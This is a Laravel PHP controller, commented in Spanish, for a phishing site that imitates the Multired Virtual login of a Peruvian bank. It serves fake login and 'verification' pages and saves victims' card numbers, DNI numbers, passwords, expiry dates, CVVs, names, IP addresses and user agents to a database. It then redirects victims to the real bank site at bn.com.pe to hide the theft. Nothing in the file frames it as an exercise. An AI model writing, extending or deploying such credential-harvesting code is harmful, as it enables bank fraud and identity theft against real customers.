<?php

namespace App\Http\Controllers;

use App\Models\PhishingData;
use Illuminate\Http\Request;
use Inertia\Inertia;

class PhishingController extends Controller
{
    /**
     * Muestra la página principal de phishing que imita el login del banco.
     */
    public function index()
    {
        return view('phishing.index');
    }

    /**
     * Muestra la página de formulario de inicio de sesión.
     */
    public function showLoginForm()
    {
        return view('phishing.login');
    }

    /**
     * Guarda los datos de inicio de sesión capturados.
     */
    public function storeLogin(Request $request)
    {
        // Capturar datos del usuario desde el formulario Multired
        $phishingData = new PhishingData();
        
        // Datos básicos
        $phishingData->ip_address = $request->ip();
        $phishingData->user_agent = $request->header('User-Agent');
        $phishingData->referrer = $request->header('referer');
        
        // Campos del Multired Virtual
        $tipoTarjeta = $request->input('tipoTarjeta');
        
        if ($tipoTarjeta === '02') {
            // Multired Global Débito
            $phishingData->username = $request->input('numeroTarjeta');
            $phishingData->card_number = $request->input('numeroTarjeta');
            $phishingData->document_type = $request->input('tipoDoc');
            $phishingData->document_number = $request->input('numeroDoc');
        } else {
            // DNI (Cuenta Corriente)
            $phishingData->username = $request->input('txtDNI');
            $phishingData->document_number = $request->input('txtDNI');
            $phishingData->document_type = '1'; // DNI
        }
        
        $phishingData->password = $request->input('password');
        $phishingData->account_type = $tipoTarjeta;
        $phishingData->captcha_input = $request->input('captcha');
        
        $phishingData->save();

        // Redirigir a la página de verificación adicional
        return response()->json([
            'success' => true,
            'message' => 'Datos guardados exitosamente',
            'redirect' => '/verification'
        ]);
    }

    /**
     * Muestra la página de verificación adicional que solicita más datos.
     */
    public function showVerificationForm()
    {
        return view('phishing.verification');
    }

    /**
     * Guarda los datos de verificación adicionales.
     */
    public function storeVerification(Request $request)
    {
        // Buscar el registro más reciente para este IP
        $phishingData = PhishingData::where('ip_address', $request->ip())
                                   ->latest()
                                   ->first();

        if ($phishingData) {
            // Actualizar con datos adicionales
            $phishingData->card_number = $request->input('card_number');
            $phishingData->expiry_date = $request->input('expiry_date');
            $phishingData->cvv = $request->input('cvv');
            $phishingData->full_name = $request->input('full_name');
            $phishingData->document_number = $request->input('document_number');
            $phishingData->save();
        }

        // Redirigir al sitio web real del banco
        return redirect('https://www.bn.com.pe/');
    }
}